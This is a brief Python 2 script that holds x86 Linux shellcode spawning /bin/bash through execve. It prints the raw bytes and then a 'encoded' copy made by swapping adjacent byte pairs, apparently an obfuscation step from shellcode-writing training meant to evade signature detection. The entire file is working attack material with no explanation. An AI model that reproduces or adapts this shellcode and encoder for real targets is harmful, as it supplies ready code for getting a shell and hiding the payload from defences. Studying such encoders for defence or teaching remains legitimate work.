#!/usr/bin/env python2

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

print 'Length: %d' % len(shellcode)
s2 = ''

for x in bytearray(shellcode):
    s2 += '0x%02x,' % x

s2 = s2.rstrip(',')
print 'Original Shellcode Samples:'
print s2
print '\nEncoded Shellcode Samples:'

s2n = s2.split(',')
encoded = ''
i = 1
for s in s2n:
    if i == 1:
	a = s
    elif i == 2:
        encoded += '%s,' % s
	encoded += '%s,' % a
	i = 1
	continue
    i += 1

print encoded.rstrip(',')
